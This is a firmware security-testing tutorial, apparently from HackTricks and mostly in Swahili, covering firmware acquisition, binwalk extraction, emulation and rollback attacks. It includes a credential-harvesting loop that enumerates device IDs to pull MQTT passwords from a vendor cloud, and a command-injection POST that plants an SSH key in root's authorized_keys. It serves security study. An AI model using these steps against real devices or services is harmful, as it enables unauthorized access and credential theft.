# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Utangulizi**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Firmware ni programu muhimu inayowezesha vifaa kufanya kazi vizuri kwa kusimamia na kurahisisha mawasiliano kati ya vipengele vya hardware na programu ambazo watumiaji wanazitumia. Inahifadhiwa katika memory ya kudumu, kuhakikisha kifaa kinaweza kupata maagizo muhimu tangu linapozimwa au kuwashwa, na kusababisha kuanzishwa kwa operating system. Kuchambua na labda kubadilisha firmware ni hatua muhimu katika kubaini udhaifu wa usalama.

## **Ukusanyaji wa Taarifa**

**Ukusanyaji wa taarifa** ni hatua muhimu ya mwanzo katika kuelewa muundo wa kifaa na teknolojia zinazotumika. Mchakato huu unahusisha kukusanya data kuhusu:

- Usanifu wa CPU na mfumo wa uendeshaji unaoendesha
- Bootloader specifics
- Mpangilio wa hardware na datasheets
- Vipimo vya codebase na maeneo ya chanzo
- Maktaba za nje na aina za leseni
- Rekodi za masasisho na vyeti vya udhibiti
- Mchoro wa usanifu na mtiririko
- Tathmini za usalama na udhaifu uliobainishwa

Kwa ajili ya hili, zana za **open-source intelligence (OSINT)** ni za thamani sana, kama vile uchambuzi wa vipengele vyovyote vya open-source kupitia ukaguzi wa mkono na wa kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa free static analysis ambayo inaweza kutumika kubaini matatizo yanayowezekana.

## **Kupata Firmware**

Kupata firmware kunaweza kufanywa kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- Kwa moja kwa moja kutoka chanzo (waendelezaji, watengenezaji)
- Kuijenga kutoka kwa maelekezo yaliyotolewa
- Kupakua kutoka tovuti rasmi za support
- Kutumia Google dork queries kutafuta faili za firmware zilizohifadhiwa
- Kupata cloud storage moja kwa moja, kwa zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kuzingilia masasisho kupitia mbinu za man-in-the-middle
- Kutoa kutoka kifaa kupitia miunganisho kama UART, JTAG, au PICit
- Kufuatilia maombi ya masasisho ndani ya mawasiliano ya kifaa (sniffing)
- Kutambua na kutumia hardcoded update endpoints
- Kudump kutoka bootloader au network
- Kutoa na kusoma storage chip, wakati kila kitu kingine kinashindwa, kwa kutumia zana za hardware zinazofaa

## Kuchambua firmware

Sasa kwa kuwa **umepata firmware**, unahitaji kutoa taarifa kuhusu ili ujue jinsi ya kuihudumia. Zana tofauti unazoweza kutumia kwa ajili ya hilo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Kama haukupata mengi kwa zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`. Ikiwa entropy ni low, basi siyo kawaida kuwa encrypted. Ikiwa entropy ni high, inawezekana kuwa encrypted (au compressed kwa namna fulani).

Moreover, you can use these tools to extract **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Kupata Filesystem

With the previous commented tools like `binwalk -ev <bin>` you should have been able to **extract the filesystem**.\
Binwalk usually extracts it inside a **folder named as the filesystem type**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Uondoaji wa Filesystem kwa Mikono

Sometimes, binwalk will **not have the magic byte of the filesystem in its signatures**. In these cases, use binwalk to **find the offset of the filesystem and carve the compressed filesystem** from the binary and **manually extract** the filesystem according to its type using the steps below.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Endesha **dd command** ifuatayo kwa ajili ya carving ya Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Vinginevyo, amri ifuatayo pia inaweza kutumika.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumiwa kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa ndani ya saraka `squashfs-root` baadaye.

- Faili za archive za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa filesystem za jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa filesystems za ubifs zenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchambua Firmware

Mara firmware inapopatikana, ni muhimu kuichambua ili kuelewa muundo wake na udhaifu unaowezekana. Mchakato huu unahusisha kutumia zana mbalimbali kuchambua na kutoa data yenye thamani kutoka kwenye picha ya firmware.

### Zana za Uchambuzi za Awali

Seti ya amri zimepewa kwa uchunguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kubaini aina za faili, kutoa strings, kuchambua data ya binary, na kuelewa mgawanyiko na maelezo ya filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
To assess the encryption status of the image, the **entropy** is checked with `binwalk -E <bin>`. Low entropy suggests a lack of encryption, while high entropy indicates possible encryption or compression.

For extracting **faili zilizowekwa**, tools and resources like the **file-data-carving-recovery-tools** documentation and **binvis.io** for file inspection are recommended.

### Extracting the Filesystem

Using `binwalk -ev <bin>`, one can usually extract the filesystem, often into a directory named after the filesystem type (e.g., squashfs, ubifs). However, when **binwalk** fails to recognize the filesystem type due to missing magic bytes, manual extraction is necessary. This involves using `binwalk` to locate the filesystem's offset, followed by the `dd` command to carve out the filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Baadaye, kulingana na aina ya filesystem (e.g., squashfs, cpio, jffs2, ubifs), amri tofauti zinatumiwa kutoa yaliyomo kwa mkono.

### Filesystem Analysis

Mara filesystem imetolewa, utafutaji wa dosari za usalama unaanza. Umakini unatolewa kwa network daemons zisizo salama, hardcoded credentials, API endpoints, update server functionalities, msimbo usio compilable, startup scripts, na compiled binaries kwa uchambuzi wa offline.

**Maeneo muhimu** na **vitu** vya kukagua ni pamoja na:

- **etc/shadow** and **etc/passwd** kwa credentials za watumiaji
- SSL certificates and keys katika **etc/ssl**
- Faili za configuration na script kwa udhaifu unaowezekana
- Embedded binaries kwa uchambuzi zaidi
- Common IoT device web servers na binaries

Zana kadhaa zinausaidia kufichua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa utafutaji wa taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi kamili wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) kwa uchambuzi wa static na dynamic

### Security Checks on Compiled Binaries

Msimbo wa chanzo na compiled binaries zilizopatikana kwenye filesystem vinapaswa kuchunguzwa kwa udhaifu. Zana kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kubaini binaries zisizo salama ambazo zinaweza kutumika.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Mifumo mingi ya IoT hupakua usanidi wa kifaa kwa kila kifaa kutoka kwenye cloud endpoint inayofanana na:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Wakati wa uchambuzi wa firmware unaweza kugundua kuwa <token> imetokana ndani kwa kutumia device ID na siri iliyowekwa kwa hardcode, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Muundo huu unawezesha yeyote anayejua deviceId na STATIC_KEY kurejesha URL na kuvuta cloud config, mara nyingi ukifichua plaintext MQTT credentials na topic prefixes.

Mchakato wa vitendo:

1) Toka deviceId kutoka kwa UART boot logs

- Unganisha adapta ya UART ya 3.3V (TX/RX/GND) na rekodi logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Angalia mistari inayochapisha cloud config URL pattern na broker address, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Rejesha STATIC_KEY na algoritimu ya token kutoka kwa firmware

- Pakia binaries ndani ya Ghidra/radare2 na tafuta config path ("/pf/") au matumizi ya MD5.
- Thibitisha algoritimu (kwa mfano MD5(deviceId||STATIC_KEY)).
- Pata token katika Bash na fanya digest kuwa herufi kubwa:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Kuvuna usanidi wa cloud na nenosiri za MQTT

- Tunga URL na pakua JSON kwa curl; changanua kwa jq ili kutoa siri:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Tumia vibaya plaintext MQTT na ACLs dhaifu za topic (ikiwa zipo)

- Tumia recovered credentials ku-subscribe kwenye maintenance topics na kutafuta sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Orodhesha IDs za vifaa zinazoweza kutabirika (kwa kiwango, kwa idhini)

- Mifumo mingi huingiza vendor OUI/product/type bytes zikifuatiwa na kiambatisho mfululizo.
- Unaweza kupitisha candidate IDs kwa mfululizo, kutengeneza tokens na kupakua configs kwa njia ya programu:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Pata idhini wazi kabla ya kujaribu mass enumeration.
- Pendelea emulation au static analysis ili kupata secrets bila kubadilisha target hardware pale inapowezekana.

Mchakato wa kuiga firmware unawawezesha **dynamic analysis** ya uendeshaji wa kifaa au ya programu binafsi. Njia hii inaweza kukumbana na changamoto zinazotokana na dependencies za hardware au architecture, lakini kuhamisha root filesystem au binaries maalum kwenye kifaa chenye architecture na endianness inayolingana, kama Raspberry Pi, au kwenye virtual machine iliyojengwa kabla, kunaweza kurahisisha upimaji zaidi.

### Kuiga Binaries Binafsi

Kwa kuchunguza programu moja, ni muhimu kubaini endianness na CPU architecture ya programu.

#### Mfano na MIPS Architecture

Kuiga binary ya MIPS architecture, unaweza kutumia command:
```bash
file ./squashfs-root/bin/busybox
```
Na kusanidi zana zinazohitajika za emulation:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

At this stage, either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities. Firmware integrity tests are critical to identify potential backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.

## Binary Exploitation and Proof-of-Concept

Developing a PoC for identified vulnerabilities requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is a distro intended to help you perform security assessment and penetration testing of Internet of Things (IoT) devices. It saves you a lot of time by providing a pre-configured environment with all the necessary tools loaded.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Even when a vendor implements cryptographic signature checks for firmware images, **version rollback (downgrade) protection is frequently omitted**. When the boot- or recovery-loader only verifies the signature with an embedded public key but does not compare the *version* (or a monotonic counter) of the image being flashed, an attacker can legitimately install an **older, vulnerable firmware that still bears a valid signature** and thus re-introduce patched vulnerabilities.

Typical attack workflow:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyo dhaifu (iliyorejeshwa kwa toleo la zamani), parameter `md5` imeunganishwa moja kwa moja kwenye amri ya shell bila kusafishwa, ikiruhusu injection ya amri yoyote (hapa – kuwezesha SSH key-based root access). Toleo za baadaye za firmware zililetwa chujio rahisi la herufi, lakini ukosefu wa downgrade protection unafanya suluhisho hilo kuwa batili.

### Kutoa firmware kutoka kwa programu za simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya companion mobile applications zao ili app iweze kusasisha kifaa kupitia Bluetooth/Wi‑Fi. Kifurushi hivi kwa kawaida huhifadhiwa bila kusimbwa katika APK/APEX chini ya paths kama `assets/fw/` au `res/raw/`. Vifaa kama `apktool`, `ghidra`, au hata plain `unzip` vinawezesha kukamata signed images bila kugusa hardware ya kimwili.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Orodha ya Kukagua Mantiki ya Update

* Je, usafirishaji/uthibitishaji wa *update endpoint* umelindwa ipasavyo (TLS + authentication)?
* Je, kifaa kinalinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya flashing?
* Je, image imethibitishwa ndani ya secure boot chain (mfano signatures zinakaguliwa na ROM code)?
* Je, userland code inafanya ukaguzi wa ziada wa sanity (mfano allowed partition map, model number)?
* Je, *partial* au *backup* update flows zinatumia tena validation logic ile ile?

> 💡  Ikiwa jambo lolote lililotajwa hapo juu linakosekana, platform huenda iwe hatarini kwa rollback attacks.

## Vulnerable firmware to practice

Ili kufanya mazoezi ya kugundua vulnerabilities katika firmware, tumia miradi ifuatayo ya vulnerable firmware kama hatua ya kuanzia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Marejeo

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Mafunzo na Cheti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
